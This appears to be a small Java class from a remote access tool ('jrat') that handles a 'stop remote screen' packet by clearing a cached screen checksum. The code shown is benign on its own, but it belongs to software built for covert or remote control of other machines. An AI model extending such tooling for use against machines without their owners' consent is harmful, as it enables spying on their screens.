package jrat.module.screen;

import jrat.client.Connection;
import jrat.client.packets.incoming.AbstractIncomingPacket;

public class Packet26StopRemoteScreen extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		Screen.prevSums = null;
	}

}
